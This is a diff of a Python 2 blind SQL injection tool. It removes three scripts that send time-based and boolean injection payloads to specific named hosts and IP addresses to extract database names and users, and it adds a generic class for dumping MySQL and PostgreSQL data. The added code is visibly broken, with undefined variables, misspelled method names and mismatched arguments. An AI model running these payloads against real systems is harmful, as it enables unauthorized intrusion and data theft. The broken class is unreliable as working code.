@@ -2,154 +2,268 @@
 # -*- coding:utf-8 -*-
 
 __Author__='moxiaoxi'
-__Filename__='blindsqlinjextion.py'
+__Filename__='sql.py'
 
+import urllib, urllib2
+import sys, time 
+import zlib
+from urlparse import urlparse, parse_qsl
 
-import httplib 
-import time 
-import string 
-import sys 
-import random 
-import urllib 
+class Blind():
+    '盲注基础类'
+    headers = {
+      'User-Agent' : 'Mozilla/4.0 (compatible;MSIE 5.5 ; Windows NT',
+      'Accept-Language' : 'en-us',
+      'Accept-Encoding' : 'text/html;q=0.9',
+      'Keep-Alive' : '300',
+      'Connection' : 'keep-alive',
+      'Cache-Control': 'max-age=0',  
+    }
 
-headers = {'Content-Type': 'application/x-www-form-urlencoded'} 
-
-payloads = 'ABCDEFGHIJKLMNOPQRSTYVWXYZ0123456789@_.' 
-
-print '[%s] Start to retrive dbname:' % time.strftime('%H:%M:%S', time.localtime()) 
-user = '' 
-isEnd=False
-for i in range(1, 36): 
-    if isEnd:
-        break
-    isEnd=True
-    for payload in payloads: 
-        url='/quickLogin'
-        start_time=time.time()
-        data='quickLoginName=lis&quickLoginPasscode=123456\' or MID(database(),'+str(i)+',1)=\''+payload+'&clientloginType=11'
-        conn = httplib.HTTPConnection('cc.263.net', timeout=60) 
-        conn.request(method='POST',url=url,body=data, headers=headers) 
-        html_doc = conn.getresponse().read() 
-        conn.close() 
-        print '.', 
-        if(time.time()-start_time>20):
-            isEnd=False
-            user += payload 
-            print '\n[in progress]', user, 
-            break 
-        time.sleep(0.01)
-print '\n[Done] db dbname is %s' % user 
-time.sleep(20)
-
-#encoding=utf-8
-
-import httplib
-
-import time
-
-import string
-
-import sys
-import re
-
-import random
-
-import urllib
-
-
-
-headers = {
-
-    'Content-Type': 'application/x-www-form-urlencoded',
-}
-
-
-
-payloads = list(string.ascii_lowercase)
-
-payloads += list(string.ascii_uppercase)
-
-for i in range(0,10):
-
-    payloads.append(str(i))
-
-
-
-
-print 'start to retrive Oracle user:'
-
-user = ''
-
-for i in range(1,5,1):
-
-    for payload in payloads:
-
-        conn = httplib.HTTPConnection('222.190.108.19', timeout=60)
-
-        params = {
-            
-            'address': "e",
-            'business_license': "e",
-            'company': "e",
-            'country': "1",
-            'email': "s",
-            'fullname': "e",
-            'password': "",
-            'phone': "e",
-            'tags': "1",
-            'tax_number': "e",
-            'username': "e' and ascii(substr(SYS_CONTEXT('USERENV','CURRENT_USER'),%s,1))=%s and 'a'='a" % (i, ord(payload)),
-
-            }
-
-        conn.request(method='POST',
-
-                     url='/addVendorsAction',
-
-                     body = urllib.urlencode(params),
-
-                     headers = headers)
-
-        start_time = time.time()
-
-        html_doc = conn.getresponse().read()
-
-        #print html_doc
-
-        conn.close()
-
-        print '.',
-
-        if re.search('用户名已存在',html_doc) > 0:  # true
-
-            user += payload
-
-            print '\n[in progress]', user
-
-            break
-
-
-
-print '\nOracle user is', user
-
-
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-import requests
-import time
-payloads='abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'
-#payloads='abcdefqrstuvwxyj'
-user=''
-print 'Start to retrive current user:'
-for i in range(1,23):
-    for payload in payloads:
-        starttime=time.time()
-        url = "http://download.android.bizhi.sogou.com/client.php?clientid=69ce12b3194bd597e9ecff768e05c172&w=720' AND (SELECT * FROM (SELECT(case when (user() like '"+user+payload+"%') then sleep(2) else sleep(0) end))lzRG) AND 'IgTp'='IgTp&h=1184&v=2.5.5.71399&dv=6.0.1&dn=Moto G 2014 LTE&dr=720x1184&r=0032-0032&j=56eae447a9e7d3b52edcc26946ba5198&i=d41d8cd98f00b204e9800998ecf8427e&n=WIFI"
-        response=requests.get(url)
-        if time.time() - starttime > 2:
-            user+=payload
-            print '\n user is:',user,
-            break
+    def __init__(self,url,good_string, data=None, vulnerable_param=None, cookie='', timeout=0, method='GET',dbms='mysql'):
+        self.url,self.params = self.parse_params(self.fix_host(url),data)
+        if len(self.params) == 0:
+            raise Exception('At least one parameter is required.')
+        if vulnerable_param is None:
+            self.vulnerable_param = self.params.keys()[-1]
         else:
-            print '.',
-print '\n[Done] current user is %s' %user
+            self.vulnerable_param = vulnerable_param
+        self.good_string = good_string
+        self.timeout = timeout
+        self.headers = Blind.headers
+        self.headers['Cookie'] = cookie
+        self.build_request = self.build_get_request if method == 'GET' else self.build_post_request
+        self.set_dbms(dbms)
+
+
+    def fix_host(self,url):
+        '规范url'
+        if((not url.startswith("http://")) and (not url.startswith("https://"))):
+            url = "http://" + hostname
+        if (url.endswith("/")):
+            url = host[:-1]
+        return url
+
+    def parse_params(self, url, data=None):
+        '拆分url得到相关信息'
+        if data is None:
+            parsed = urlparse(url)
+            data = parsed.query
+            url = parsed.scheme + '://' + parsed.hostname +parsed.path
+        data = dict(parse_qsl(data,True))
+        return (url, data)
+
+    def set_dbms(self,dbms):
+        dbms_functions = {
+            'mysql' : (self.to_hex, self.concat_ws),
+            'pg' : (self.to_pg_string, self.concat_pg)
+        }
+        if not dbms in dbms_functions:
+            raise Exception('Valid DBMSs are ' + " and ".join(dbms_functions.keys()))
+        self.to_str,self.concat = dbms_functions[dbms]
+        self.dbms =dbms
+
+    #这里的url包括路径
+    def build_post_request(self, url, params):
+        return urllib2.Request(self.url,urllib.urlencode(params), self.headers)
+
+    
+    def build_get_request(self, url, params):
+        return urllib2.Request(self.url + '?' + urllib.urlencode(params),None,self.headers)
+    
+    def make_request(self, params):
+        return self.send_request(self.build_request(self.url),params)
+
+    def send_request(self,req):
+        result = urllib2.urlopen(req)
+        data = result.read()
+        hdrs =  result.headers
+        if 'Content-Encoding' in hdrs and hdrs['Content-Encoding'] == 'gzip':
+            data = zlib.decompress(result,16+zlib.MAX_WBITS)
+        result = self.request_succcessful(data)
+        time.sleep(self.timeout)
+        return result
+    
+    def request_successful(self, data):
+        return self.good_string in data
+
+    def count_params(self, operator, number, table):
+        params = dict(self.params)
+        params[self.vulnerable_param] += ' and {0} {1} （select count(*) from {2})'.format(number,operator,table)
+        return params
+
+    def length_params(self, operator,number, field, table, offest):
+        params = dict(self.paramas)
+        table = ' from ' + table if table is not None else ''
+        params[self.vulnerable_param] += ' and {0} {1} (select length({2}) {3} limit 1 offset {4})'.format(number, operator, field, table, offset)
+        return params
+
+    def data_params(self, operator, number, field, table,offset):
+        params = dict(self.params)
+        table = ' from ' + table if table is not None else ''
+        params[self.vulnerable_param] += ' and {0} < (select ascii(substring({1}, {2}, 1)) {3} limit 1 offset {4}'.format(number, field, str_index, table, offset)
+        return params
+
+    def echo_trying(self, string, number):
+        sys.stdout.write('\rTrying {0} {1}'.format(string, number))
+        sys.stdout.flush()
+
+
+    def guess_count(self, table):
+        length = 0
+        last = 1
+        while True:
+            self.echo_trying('count', last)
+            params =  self.count_params('>', last, table)
+            if self.make_request(params):
+                break
+            last *= 2
+        sys.stdout.write('\rAt most count ' + str(last))
+        sys.stdout.flush()
+        #接下来使用二分法
+        first = last / 2
+        while first < last:
+            middle = (first + last ) / 2
+            params = self.count_params('<',last,table)
+            if self.make_request(params):
+                first = middle + 1
+            else:
+                last = middle 
+            if middle ==  last -1:
+                return middle+1
+            else:
+                if first == last:
+                    return middle
+        return pri
+
+    def guess_len(self, field, table, index):
+        length = 0 
+        last = 1
+        while True:
+            self.echo_tring('length',last)
+            params =  self.length_params('>',last,field,table,index)
+            if self.make_request(params):
+                break
+            last *= 2
+        sys.stdout.write('\rAt most length '+ str(last))
+        sts.stdout.flush()
+        first =  last / 2
+        while first < last:
+            middle = (first + last) / 2
+            params =  self.length_params('<',middle, field, table, index)
+            if self.make_request(params):
+                first =  middle +1
+            else:
+                last = middle
+            if middle == last - 1:
+                return middle +1
+            else:
+                if first == last:
+                    return middle
+        return pri
+
+    def query_offset(self, field, table = None, offset=0):
+        length = self.guess_len(field, table, offset)
+        print '\r[+] Guessed length: ' + str(length)
+        output = ''
+        for i in range(1,length+1):
+            first = ord(' ')
+            last = 126
+            curSize = len(output)
+            while curSize == len(output):
+                middle =  (first + last) / 2
+                params = self.data_params(middle, field, i, table, offset)
+                if self.make_request(params):
+                    first = middle+1
+                else:
+                    last = middle
+
+                if middle == last -1:
+                    sys.stdout.write(chr(middle+1))
+                    output += chr(middle+1)
+                else:
+                    if first == last:
+                        sys.stdout.write(chr(middle))
+                        output += chr(middle)
+                sys.stdout.flush()
+        print ''
+        return output
+
+    def count_query(self, table):
+        print '[+] Guessing count...'
+        print '\r[+] Guessed count:' + str(self.guess_count(table))
+
+    def to_hex(self,s):
+        return '0x' + ''.join(map(lambda i: hex(ord(i)).replace('0x',''),s))
+
+    def concat_ws(self,fields):
+        return 'concat_ws(0x3a,{0})'.format(fields)
+
+    def concat_pg(self,fields):
+        output = ''
+        for i in fields.split(','):
+            if len(output) >0:
+                output += '||CHR(58)||' + i
+            else:
+                output += i 
+        return output + ''
+
+    def to_pg_string(self, s):
+        return '||'.join(map(lambda x: 'CHR(' + str(ord(x)) + ')',s))
+
+    def parse_where(self,where):
+        where_cond = []
+        for i in where.split(' '):
+            if(len(i) > 0 and i[0] == "'"):
+                where_cond.append(self.to_str(i[1:-1]))
+            else:
+                where_cond.append(i)
+        return ' '.join(where_cond)
+
+
+    def query(self, fields, table, where='', start=0):
+        try:
+            print '[+] Guessing number of rows...'
+            if len(where) > 0:
+                where = self.parse_where(where)
+                table = table + ' where ' + where
+            if ',' in fields:
+                fields = self.concat(fields)
+            count = self.guess_count(table)
+            print '\r[+] Rows: ' + str(count) + '         '
+            results = []
+            for i in range(start, count):
+                print '[i] Dumping record ' + str(i+1) + '/' + str(count)
+                results.append(self.query_offset(fields, table, i))
+            print '[+] Query results:'
+            for i in results:
+                print ' -> ' + i
+            return results
+        except KeyboardInterrupt:
+            print ''
+
+    def proof_of_concept(self):
+        if self.dbms == 'mysql':
+            username = 'user()'
+            database = 'database()'
+            version = 'version()'
+        elif self.dbms == 'pg':
+            username = 'getpgusername()'
+            database = 'current_database()'
+            version = 'version()'
+        else:
+            raise Exception("DBMS not supportd yet")
+        print '[+] Retrieving username'
+        username =  self.query_offset(username)
+        print '[+] Retrieving database'
+        database = self.query_offset(database)
+        print '[+] Retrieving version '
+        version = self.query_offset(version)
+        print '[+] Username: ' + username
+        print '[+] Database: ' + database
+        print '[+] Version: ' + version
+
+
+if __name__ == "__main__":
+    test = Blind('http://www.baidu.com/index.php?username=12','yes')
+    test.parse_params('http://www.baidu.com/index.php?username=12')
